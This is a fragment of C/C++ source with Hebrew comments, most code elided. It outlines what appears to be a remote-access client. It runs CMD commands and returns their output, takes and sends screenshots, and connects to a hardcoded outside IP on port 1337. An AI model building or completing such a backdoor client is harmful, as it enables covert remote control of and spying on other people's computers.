...
// הפונקציה exec מבצעת הפעלת פקודות דרך CMD ומחזירה את התוצאה
...
// הפונקציה sendScreenshot מבצעת צילום מסך ושולחת את התמונה
...
// הפונקציה GetEncoderClsid מקבלת פורמט ומוחזרת את ה-CLSID שלו
...
// הפונקציה main מייצגת את נקודת הכניסה לתוכנית
void main()
{
    string ipAddress = "77.127.189.27";            // כתובת ה-IP של השרת
    int port = 1337;                        // הפורט לצ'אט
    ...
    // כאן תיכנס הלולאת התקשורת בין הלקוח לשרת
    char buf[4096];
    char p[] = "power";
